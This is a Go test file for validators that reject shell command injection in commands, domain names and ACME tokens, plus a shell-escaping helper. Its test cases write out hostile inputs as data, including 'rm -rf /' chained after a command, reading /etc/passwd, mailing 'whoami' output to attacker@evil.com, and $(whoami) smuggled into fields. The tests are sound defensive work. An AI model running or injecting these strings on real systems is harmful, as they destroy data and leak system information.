package validation

import (
	"strings"
	"testing"
)

// TestValidateShellCommand tests command injection prevention.
func TestValidateShellCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
		errMsg  string
	}{
		// Valid commands
		{
			name:    "simple command",
			cmd:     "nginx",
			wantErr: false,
		},
		{
			name:    "command with path",
			cmd:     "/usr/sbin/nginx",
			wantErr: false,
		},
		{
			name:    "systemctl command",
			cmd:     "systemctl",
			wantErr: false,
		},
		{
			name:    "apachectl",
			cmd:     "apachectl",
			wantErr: false,
		},

		// Command injection attempts - semicolon
		{
			name:    "semicolon injection",
			cmd:     "nginx; rm -rf /",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "command chaining with semicolon",
			cmd:     "cmd1; cmd2",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - pipe
		{
			name:    "pipe injection",
			cmd:     "cat /etc/passwd | grep root",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "pipe to sensitive command",
			cmd:     "whoami | mail attacker@evil.com",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - ampersand
		{
			name:    "background execution injection",
			cmd:     "nginx &",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "command separation with &&",
			cmd:     "cmd1 && cmd2",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "command separation with ||",
			cmd:     "cmd1 || cmd2",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - dollar sign / command substitution
		{
			name:    "command substitution with $()",
			cmd:     "echo $(whoami)",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "command substitution with backticks",
			cmd:     "echo `whoami`",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "variable expansion",
			cmd:     "echo $PATH",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - quotes
		{
			name:    "double quote injection",
			cmd:     `echo "test" | cat`,
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "single quote injection",
			cmd:     "echo 'test' | cat",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - redirection
		{
			name:    "output redirection injection",
			cmd:     "nginx > /tmp/nginx.out",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "input redirection injection",
			cmd:     "cat < /etc/passwd",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},
		{
			name:    "append redirection injection",
			cmd:     "nginx >> /tmp/log",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - subshell
		{
			name:    "subshell with parentheses",
			cmd:     "bash (whoami)",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - brace expansion
		{
			name:    "brace expansion injection",
			cmd:     "echo {1..100000}",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - backslash escaping
		{
			name:    "backslash escape injection",
			cmd:     "echo test\\nmalicious",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Command injection attempts - newlines
		{
			name:    "newline injection",
			cmd:     "nginx\nrm -rf /",
			wantErr: true,
			errMsg:  "shell metacharacter",
		},

		// Edge cases
		{
			name:    "empty command",
			cmd:     "",
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name:    "overly long command",
			cmd:     string(make([]byte, 1025)),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateShellCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateShellCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
			if tt.wantErr && tt.errMsg != "" && (err == nil || !strings.Contains(err.Error(), tt.errMsg)) {
				t.Errorf("ValidateShellCommand() error message %q does not contain %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidateDomainName tests domain name validation.
func TestValidateDomainName(t *testing.T) {
	tests := []struct {
		name    string
		domain  string
		wantErr bool
		errMsg  string
	}{
		// Valid domains
		{
			name:    "simple domain",
			domain:  "example.com",
			wantErr: false,
		},
		{
			name:    "subdomain",
			domain:  "sub.example.com",
			wantErr: false,
		},
		{
			name:    "multiple subdomains",
			domain:  "a.b.c.example.com",
			wantErr: false,
		},
		{
			name:    "wildcard domain",
			domain:  "*.example.com",
			wantErr: false,
		},
		{
			name:    "wildcard subdomain",
			domain:  "*.sub.example.com",
			wantErr: false,
		},
		{
			name:    "domain with hyphens",
			domain:  "my-domain.com",
			wantErr: false,
		},
		{
			name:    "domain with numbers",
			domain:  "example123.com",
			wantErr: false,
		},
		{
			name:    "uk domain",
			domain:  "example.co.uk",
			wantErr: false,
		},
		{
			name:    "single label",
			domain:  "localhost",
			wantErr: false,
		},

		// Command injection attempts - embedded shell
		{
			name:    "domain with command injection semicolon",
			domain:  "example.com; rm -rf /",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain with backtick injection",
			domain:  "example.com`whoami`",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain with command substitution",
			domain:  "example.com$(whoami)",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain with pipe injection",
			domain:  "example.com | cat /etc/passwd",
			wantErr: true,
			errMsg:  "invalid",
		},

		// Invalid characters
		{
			name:    "domain with space",
			domain:  "example .com",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain with underscore",
			domain:  "example_domain.com",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain starting with hyphen",
			domain:  "-example.com",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain ending with hyphen",
			domain:  "example-.com",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain with double dots",
			domain:  "example..com",
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name:    "domain starting with dot",
			domain:  ".example.com",
			wantErr: true,
			errMsg:  "invalid",
		},

		// Edge cases
		{
			name:    "empty domain",
			domain:  "",
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name:    "overly long domain",
			domain:  strings.Repeat("a", 254),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
		{
			name:    "label exceeds 63 characters",
			domain:  strings.Repeat("a", 64) + ".com",
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDomainName(tt.domain)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDomainName() error = %v, wantErr %v", err, tt.wantErr)
			}
			if tt.wantErr && tt.errMsg != "" && (err == nil || !strings.Contains(err.Error(), tt.errMsg)) {
				t.Errorf("ValidateDomainName() error message %q does not contain %q", err, tt.errMsg)
			}
		})
	}
}

// TestValidateACMEToken tests ACME token validation.
func TestValidateACMEToken(t *testing.T) {
	tests := []struct {
		name    string
		token   string
		wantErr bool
		errMsg  string
	}{
		// Valid tokens (base64url safe)
		{
			name:    "simple token",
			token:   "abc123",
			wantErr: false,
		},
		{
			name:    "token with underscores",
			token:   "abc_123_def",
			wantErr: false,
		},
		{
			name:    "token with hyphens",
			token:   "abc-123-def",
			wantErr: false,
		},
		{
			name:    "token with mixed case",
			token:   "AbC123DeF",
			wantErr: false,
		},
		{
			name:    "long valid token",
			token:   strings.Repeat("a", 511),
			wantErr: false,
		},

		// Command injection attempts
		{
			name:    "token with command substitution",
			token:   "token$(whoami)",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with backtick injection",
			token:   "token`whoami`",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with semicolon",
			token:   "token;malicious",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with pipe",
			token:   "token|cat",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with ampersand",
			token:   "token&malicious",
			wantErr: true,
			errMsg:  "invalid characters",
		},

		// Special characters
		{
			name:    "token with space",
			token:   "token value",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with dot",
			token:   "token.value",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with slash",
			token:   "token/value",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with equals",
			token:   "token=value",
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name:    "token with plus",
			token:   "token+value",
			wantErr: true,
			errMsg:  "invalid characters",
		},

		// Edge cases
		{
			name:    "empty token",
			token:   "",
			wantErr: true,
			errMsg:  "cannot be empty",
		},
		{
			name:    "overly long token",
			token:   strings.Repeat("a", 513),
			wantErr: true,
			errMsg:  "exceeds maximum length",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateACMEToken(tt.token)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateACMEToken() error = %v, wantErr %v", err, tt.wantErr)
			}
			if tt.wantErr && tt.errMsg != "" && (err == nil || !strings.Contains(err.Error(), tt.errMsg)) {
				t.Errorf("ValidateACMEToken() error message %q does not contain %q", err, tt.errMsg)
			}
		})
	}
}

// TestSanitizeForShell tests shell escaping.
func TestSanitizeForShell(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		output string
	}{
		{
			name:   "plain text",
			input:  "hello",
			output: "'hello'",
		},
		{
			name:   "text with spaces",
			input:  "hello world",
			output: "'hello world'",
		},
		{
			name:   "text with single quote",
			input:  "hello'world",
			output: "'hello'\"'\"'world'",
		},
		{
			name:   "text with multiple single quotes",
			input:  "it's John's",
			output: "'it'\"'\"'s John'\"'\"'s'",
		},
		{
			name:   "text with command injection",
			input:  "$(whoami)",
			output: "'$(whoami)'",
		},
		{
			name:   "text with backticks",
			input:  "`whoami`",
			output: "'`whoami`'",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeForShell(tt.input)
			if result != tt.output {
				t.Errorf("SanitizeForShell() = %q, want %q", result, tt.output)
			}
		})
	}
}

